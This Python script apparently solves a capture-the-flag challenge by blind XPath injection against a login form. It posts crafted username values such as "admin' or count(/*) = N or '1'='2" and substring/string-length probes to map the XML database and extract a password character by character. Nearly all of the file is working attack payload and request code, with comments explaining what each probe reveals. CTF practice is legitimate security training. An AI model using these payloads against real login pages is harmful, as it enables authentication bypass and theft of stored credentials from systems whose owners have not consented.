# http://docs.python-requests.org/en/master/user/quickstart/#make-a-request
import string
import requests
import time
import binascii
import sys
#from urllib import unquote

alphabet = "_{}" + string.digits + string.ascii_letters
found = ""
flag_length = 64
url = "https://challenge.acictf.com/problem/27747/login.php"


"""
3 things in database
<creds> has 2 sub elements
	<user>	admin
	<pass>	(blank)
</creds>
<pass>

</pass>
has 0 sub elements
"""

i = sys.argv[1]

# for name
d = {"username":"admin' or count(/*) = " + str(i) + " or '1'='2", "password":"test"}							# see how many things there are
d = {"username":"admin' or count(/*[1]/*) = " + str(i) + " or '1'='2", "password":"test"}						# see how many things there are within structure
d = {"username":"admin' or string-length(name(/*[1]/*[1])) = " + str(i) + " or '1'='2", "password":"test"}				# find length of name of that entity
d = {"username":"admin' or substring(name(/*[1]/*[2]), " + str(i) + ", 1) = '" + sys.argv[2] + "' or '1'='2", "password":"test"}		# match character (string, start(1 based), length)
d = {"username":"admin' or string-length(name(/*[1])) = " + str(i) + " or '1'='2", "password":"test"}					# go back up 1
d = {"username":"admin' or substring(name(/*[1]), " + str(i) + ", 1) = '" + sys.argv[2] + "' or '1'='2", "password":"test"}		# 
d = {"username":"admin' or string-length(/*[1]/pass/text()) = " + str(i) + " or '1'='2", "password":"test"}				# get actual value
d = {"username":"admin' or count(//*) = " + str(i) + " or '1'='2", "password":"test"}							# entire database

for count in range(10):
	d = {"username":"admin' or count(//comment()) = " + str(count) + " or '1'='2", "password":"test"}
	# d = {"username":"adin' or string-length(name(//*[3])) = " + str(count) + " or '1'='2", "password":"test"}
	# d = {"username":"adin' or substring(name(//*[1]/*[1]), " + str(count) + ", 1) = '" + sys.argv[2] + "' or '1'='2", "password":"test"}
	r = requests.post(url, data=d)

	print(count)
	print(r.text)
	print(r.status_code)

exit()

print("-" * 50)

# for name
d = {"username":"admin' or substring(/*[1]/*[1]/text(), 1, 1) = 'a' or '1'='2", "password":"test"}
r = requests.post(url, data=d)

print(r.text)
print(r.status_code)

exit()

print("-" * 50)

# Test if xpath2, which has more features
d = {"username":"admin' and lower-case('A') = 'a' or '1'='1", "password":"test"}
d = {"username":"admin' and lower-case('A') = \"a\" or '1'='1", "password":"test"}
r = requests.post(url, data=d)

print(r.text)
print(r.status_code)

# https://media.blackhat.com/bh-eu-12/Siddharth/bh-eu-12-Siddharth-Xpath-WP.pdf
